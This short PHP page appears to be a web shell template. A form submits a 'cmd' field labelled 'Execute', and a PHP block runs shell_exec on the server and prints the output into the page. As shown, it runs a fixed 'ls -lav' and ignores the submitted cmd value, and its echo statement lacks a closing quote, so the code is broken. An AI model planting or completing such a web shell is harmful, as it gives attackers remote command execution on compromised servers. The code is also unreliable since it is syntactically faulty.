<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
   $output = shell_exec('ls -lav');
   echo "<h1>$output</h1>;
?>
</pre>
</body>
</html>
